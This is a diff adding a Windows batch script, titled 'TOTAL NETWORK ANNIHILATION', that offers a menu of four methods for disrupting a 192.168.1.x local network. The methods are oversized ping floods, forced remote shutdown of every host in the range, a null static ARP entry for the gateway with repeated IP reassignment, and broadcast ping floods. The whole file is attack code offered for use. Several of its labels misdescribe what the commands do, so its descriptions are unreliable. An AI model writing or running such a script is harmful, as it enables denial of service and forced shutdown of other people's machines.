@@ -1,0 +1,51 @@
+@echo off
+setlocal enabledelayedexpansion
+title TOTAL NETWORK ANNIHILATION - Just-Lisa Edition
+echo [!!! WARNING: THIS WILL DESTROY ENTIRE NETWORK !!!]
+echo.
+echo Methods available:
+echo 1] SYN Flood + Remote Shutdown Combo
+echo 2] ARP Cache Poisoning Massacre  
+echo 3] Switch CPU Overload Attack
+echo 4] BROADCAST DEATH PACKET
+set /p method="Select annihilation method [1-4]: "
+
+if "!method!"=="1" goto synflood
+if "!method!"=="2" goto arpdeath
+if "!method!"=="3" goto switchkill
+if "!method!"=="4" goto broadcastdeath
+
+:synflood
+echo Initializing SYN Flood + Shutdown Combo...
+for /l %%a in (1,1,254) do (
+    start /min cmd /c "ping -l 65500 -n 1000 192.168.1.%%a"
+    shutdown /m \\192.168.1.%%a /s /f /t 0
+)
+goto end
+
+:arpdeath
+echo Deploying ARP Cache Poisoning Massacre...
+set /p gateway="Enter gateway IP: "
+for /l %%i in (1,1,254) do (
+    arp -s !gateway! 00-00-00-00-00-00
+    netsh interface ip set address "Local Area Connection" static 192.168.1.%%i 255.255.255.0 !gateway!
+)
+goto end
+
+:switchkill
+echo Loading Switch CPU Overload Attack...
+for /l %%x in (1,1,1000) do (
+    for /l %%y in (1,1,254) do (
+        ping -l 65000 -n 10 192.168.1.%%y
+    )
+)
+goto end
+
+:broadcastdeath
+echo BROADCAST DEATH PACKET ACTIVATED!
+ping -l 65507 -n 100000 255.255.255.255
+goto end
+
+:end
+echo ANNIHILATION COMPLETE.
+pause
